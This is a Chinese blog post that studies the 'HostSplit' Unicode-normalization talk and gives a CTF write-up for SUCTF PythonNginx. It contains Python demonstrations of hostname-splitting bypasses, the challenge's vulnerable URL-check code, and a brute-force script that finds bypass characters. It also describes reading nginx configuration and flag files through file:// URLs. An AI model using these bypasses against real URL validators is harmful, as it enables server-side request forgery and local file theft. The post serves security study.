{"title":"HostSplit-Exploitable","slug":"HostSplit","date":"2019-08-22T03:39:23.000Z","updated":"2019-09-03T14:21:11.682Z","comments":true,"path":"api/articles/HostSplit.json","photos":[],"link":"","excerpt":"🐱黑帽大会议题","covers":["http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg","http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpd5xcfj30pa09pq3k.jpg","http://wx1.sinaimg.cn/mw690/006boCb9ly1g68vpgbsavj30qj0dq765.jpg","http://wx3.sinaimg.cn/mw690/006boCb9ly1g68vpjpmkej30oy0cgdh1.jpg","http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpmmt76j30ok070dgl.jpg"],"content":"<p>🐱黑帽大会议题</p>\n<a id=\"more\"></a>\n<p>8/22/2019 11:39:23 AM </p>\n<h1 id=\"HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习\"><a href=\"#HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization-学习\" class=\"headerlink\" title=\"HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习\"></a>HostSplit-Exploitable-Antipatterns-In-Unicode-Normalization 学习</h1><h2 id=\"IDN-与-UTF-8\"><a href=\"#IDN-与-UTF-8\" class=\"headerlink\" title=\"IDN 与 UTF-8\"></a>IDN 与 UTF-8</h2><p><strong>IDN</strong></p>\n<blockquote>\n<p>国际化域名IDNs (Internationalized Domain Names)也称多语种域名，是指非英语国家为推广本国语言的域名系统的一个总称，例如含有日文的为日文域名，含有中文的域名为中文域名。<br>科研人员又将纯数字表示的IP地址基础上推出更加便于记忆的字符型访问标识，即基于IP地址的域名系统。这些域名只能使用63个ASCII字符（”a-z”，”A-Z”，”0-9”，”-“）. 随着互联网在非英语国家的迅猛发展，九十年代末期国际互联网界提出了将原本只能使用63个ASCII字符的域名，采用本地语言文字来表示，也就是出现了对多语种域名的需求。</p>\n</blockquote>\n<p><a href=\"http://中国政府.政务/\" target=\"_blank\" rel=\"noopener\">http://中国政府.政务/</a></p>\n<p>这是我国的政府网站！</p>\n<p><strong>UTF-8</strong></p>\n<blockquote>\n<p>UTF-8（8-bit Unicode Transformation Format）是一种针对Unicode的可变长度字符编码，由Ken Thompson于1992年创建，现在已经标准化为RFC 3629。UTF-8用1到4个字节编码Unicode字符。用在网页上可以统一页面显示中文简体繁体及其它语言.</p>\n</blockquote>\n<p>Puny 编码 (Punycode)</p>\n<blockquote>\n<p>这是一个简易而准确的IDN ASCII 编码系统 (ASCII-Compatible Encoding (ACE))。它能转换一系列的 字符编码成为字符以符合主机名称(hostname)标准 (ASCII 字母，数位和连字符号)。<br>例: xn–0zwm56d.test </p>\n</blockquote>\n<pre><code>中国.政府-&gt;xn--fiqs8s.xn--mxtq1m</code></pre><h2 id=\"Unicode-➔-ASCII-–-A-Two-Step-Process\"><a href=\"#Unicode-➔-ASCII-–-A-Two-Step-Process\" class=\"headerlink\" title=\"Unicode ➔ ASCII – A Two Step Process\"></a>Unicode ➔ ASCII – A Two Step Process</h2><ol>\n<li>Normalization Convert characters to a “standardized form”.</li>\n<li>Punycoding Turn Unicode into ASCII.</li>\n</ol>\n<p>意思就是说IDN的使用底层还是ASCII的功劳。先转换成标准形式然后进行puny编码。</p>\n<p><img src=\"http://wx2.sinaimg.cn/mw690/006boCb9ly1g68vpab2bbj30qn08tq3k.jpg\" alt=\"转换过程\"></p>\n<h2 id=\"Splitting-Hostnames\"><a href=\"#Splitting-Hostnames\" class=\"headerlink\" title=\"Splitting Hostnames\"></a>Splitting Hostnames</h2><pre><code>https://evil.c℀.Example.com</code></pre><p>我们对他进行转换成ASCII会发生什么？</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpd5xcfj30pa09pq3k.jpg\" alt=\"Normalizing \"></p>\n<pre><code>https://evil.ca/c.Example.com</code></pre><p><strong>No need to Punycode anything – it’s all ASCII now!</strong>也就是不用再次编码已经可以解析了</p>\n<h2 id=\"python-utf-8-unicode-ascii互转\"><a href=\"#python-utf-8-unicode-ascii互转\" class=\"headerlink\" title=\"python utf-8,unicode,ascii互转\"></a>python utf-8,unicode,ascii互转</h2><p>unicode-&gt;ascii</p>\n<pre><code>&gt;&gt;&gt; ord(u&apos;脑&apos;)\n33041</code></pre><p>ascii-&gt;unicode</p>\n<pre><code>&gt;&gt;&gt; chr(33041)\n&apos;脑</code></pre><p>unicode &lt;=&gt; utf-8</p>\n<pre><code>&gt;&gt;&gt; n = u.encode(&apos;utf8&apos;)\n&gt;&gt;&gt; n\nb&apos;\\xe5\\xb1\\x8c&apos;\n\n&gt;&gt;&gt; m = n.decode(&apos;utf8&apos;)</code></pre><p>注：linux默认编码为unicode，若为其他两种编码进行转换，需unicode作为“媒介</p>\n<h2 id=\"Python-was-vulnerable\"><a href=\"#Python-was-vulnerable\" class=\"headerlink\" title=\"Python was vulnerable\"></a>Python was vulnerable</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlsplit, urlunsplit \n&gt;&gt;&gt; url = &apos;http://canada.c℀.microsoft.com/some.txt&apos; \n&gt;&gt;&gt; parts = list(urlsplit(url)) \n&gt;&gt;&gt; host = parts[1] \n&gt;&gt;&gt; host &apos;canada.c℀.microsoft.com&apos; \n&gt;&gt;&gt; newhost = [] \n&gt;&gt;&gt; for h in host.split(&apos;.&apos;): \n... newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;)) \n... \n&gt;&gt;&gt; parts[1] = &apos;.&apos;.join(newhost) \n&gt;&gt;&gt; finalUrl = urlunsplit(parts) \n&gt;&gt;&gt; finalUrl \n&apos;http://canada.ca/c.microsoft.com/some.txt&apos; </code></pre><h2 id=\"Python-had-an-extra-variant\"><a href=\"#Python-had-an-extra-variant\" class=\"headerlink\" title=\"Python had an extra variant\"></a>Python had an extra variant</h2><pre><code>&gt;&gt;&gt; from urllib.parse import urlparse \n&gt;&gt;&gt; r=&apos;http://bing.com&apos;+u&apos;\\uFF03&apos;+&apos;:password@products.office.com&apos; \n&gt;&gt;&gt; o = urlparse(r) \n&gt;&gt;&gt; o.hostname &apos;products.office.com&apos; \n&gt;&gt;&gt; a = r.encode(&quot;IDNA&quot;).decode(&quot;ASCII&quot;) \n&gt;&gt;&gt; a &apos;http://bing.com#:password@products.office.com&apos; \n&gt;&gt;&gt; o = urlparse(a) \n&gt;&gt;&gt; o.hostname \n&apos;bing.com&apos;</code></pre><h2 id=\"SUCTF-PythonNginx\"><a href=\"#SUCTF-PythonNginx\" class=\"headerlink\" title=\"SUCTF PythonNginx\"></a>SUCTF PythonNginx</h2><p>SUCTF中的一道题：</p>\n<pre><code>    @app.route(&apos;/getUrl&apos;, methods=[&apos;GET&apos;, &apos;POST&apos;])\ndef getUrl():\n    url = request.args.get(&quot;url&quot;)\n    host = parse.urlparse(url).hostname\n    if host == &apos;suctf.cc&apos;:\n        return &quot;我扌 your problem? 111&quot;\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == &apos;suctf.cc&apos;:\n        return &quot;我扌 your problem? 222 &quot; + host\n    newhost = []\n    for h in host.split(&apos;.&apos;):\n        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))\n    parts[1] = &apos;.&apos;.join(newhost)\n    #去掉 url 中的空格\n    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == &apos;suctf.cc&apos;:\n        return urllib.request.urlopen(finalUrl).read()\n    else:\n        return &quot;我扌 your problem? 333&quot;</code></pre><p>爆破最后一位c</p>\n<pre><code>from urllib.parse import urlparse,urlunsplit,urlsplit\nfrom urllib import parse\ndef get_unicode():\n    for x in range(65536):\n        uni=chr(x)\n        url=&quot;http://suctf.c{}&quot;.format(uni)\n        try:\n            if getUrl(url):\n                print(&apos;11&apos;)\n                print(&quot;str: &quot;+uni+&apos; unicode: \\\\u&apos;+str(hex(x))[2:])\n        except:\n            pass\n\n\ndef getUrl(url):\n    url = url\n    host = parse.urlparse(url).hostname\n    if host == &apos;suctf.cc&apos;:\n        return False\n    parts = list(urlsplit(url))\n    host = parts[1]\n    if host == &apos;suctf.cc&apos;:\n        return False\n    newhost = []\n    for h in host.split(&apos;.&apos;):\n        newhost.append(h.encode(&apos;idna&apos;).decode(&apos;utf-8&apos;))\n    parts[1] = &apos;.&apos;.join(newhost)\n    finalUrl = urlunsplit(parts).split(&apos; &apos;)[0]\n    host = parse.urlparse(finalUrl).hostname\n    if host == &apos;suctf.cc&apos;:\n        return True\n    else:\n        return False\n\nif __name__==&quot;__main__&quot;:\n    get_unicode()\n\nstr: �G unicode: \\u2105\nstr: �� unicode: \\uff23\nstr: �� unicode: \\uff43\n[Finished in 6.5s]</code></pre><p>我们看一下各个判断的结果</p>\n<pre><code>from urllib.parse import urlparse,urlunsplit,urlsplit\nfrom urllib import parse\nurl = &apos;http://canada.c℀.microsoft.com/some.txt&apos;\nparts = parse.urlparse(url)\n&gt;&gt;&gt; parts\nParseResult(scheme=&apos;http&apos;, netloc=&apos;canada.c℀.microsoft.com&apos;, path=&apos;/some.txt&apos;, params=&apos;&apos;, query=&apos;&apos;, fragment=&apos;&apos;)\n&gt;&gt;&gt; host = parts.hostname\n&gt;&gt;&gt; host\n&apos;canada.c℀.microsoft.com&apos;\n&gt;&gt;&gt; parts1 = list(urlsplit(url))\n&gt;&gt;&gt; parts1\n[&apos;http&apos;, &apos;canada.c℀.microsoft.com&apos;, &apos;/some.txt&apos;, &apos;&apos;, &apos;&apos;]</code></pre><p>可以看到已经可以绕过判断了</p>\n<h3 id=\"hosts文件\"><a href=\"#hosts文件\" class=\"headerlink\" title=\"hosts文件\"></a>hosts文件</h3><p>Hosts是一个没有扩展名的系统文件，可以用记事本等工具打开，其作用就是将一些常用的网址域名与其对应的IP地址建立一个关联“数据库”，当用户在浏览器中输入一个需要登录的网址时，系统会首先自动从Hosts文件中寻找对应的IP地址，一旦找到，系统会立即打开对应网页，如果没有找到，则系统再会将网址提交DNS域名解析服务器进行IP地址的解析。</p>\n<h3 id=\"file协议\"><a href=\"#file协议\" class=\"headerlink\" title=\"file协议\"></a>file协议</h3><p>中文意思：本地文件传输协议<br>什么是File：File协议主要用于访问本地计算机中的文件，就如同在Windows资源管理器中打开文件一样。<br>如何使用File：要使用File协议，基本的格式如下：file:///文件路径，比如要打开F盘flash文件夹中的1.swf文件，那么可以在资源管理器或浏览器地址栏中输入：file:///f:/flash/1.swf回车。</p>\n<h3 id=\"nginx配置\"><a href=\"#nginx配置\" class=\"headerlink\" title=\"nginx配置\"></a>nginx配置</h3><p> Nginx的配置文件是一个纯文本文件，它一般位于Nginx安装目录的conf目录下，整个配置文件是以block的形式组织的。每个block一般以一个大括号“{”来表示。block 可以分为几个层次，整个配置文件中Main命令位于最高层，在Main层下面可以有Events、 HTTP等层级，而在HTTP层中又包含Server层，即server block, serverblock中又可分为location层，并且一个server block中可以包含多个location block。</p>\n<p>nginx配置文件路径</p>\n<pre><code>[root@localhost vhost]# locate nginx.conf\n/usr/local/nginx/conf/nginx.conf\n/usr/local/nginx/conf/nginx.conf.default</code></pre><p>hosts文件绑定本地回环地址，尝试file读文件</p>\n<p><img src=\"http://wx1.sinaimg.cn/mw690/006boCb9ly1g68vpgbsavj30qj0dq765.jpg\" alt=\"尝试读文件\"></p>\n<p>读nginx配置文件</p>\n<p><img src=\"http://wx3.sinaimg.cn/mw690/006boCb9ly1g68vpjpmkej30oy0cgdh1.jpg\" alt=\"读配置文件\"></p>\n<p>读flag</p>\n<p><img src=\"http://wx4.sinaimg.cn/mw690/006boCb9ly1g68vpmmt76j30ok070dgl.jpg\" alt=\"读flag\"></p>\n","categories":[{"name":"ctf","slug":"ctf","count":24,"path":"api/categories/ctf.json"}],"tags":[{"name":"python","slug":"python","count":1,"path":"api/tags/python.json"}]}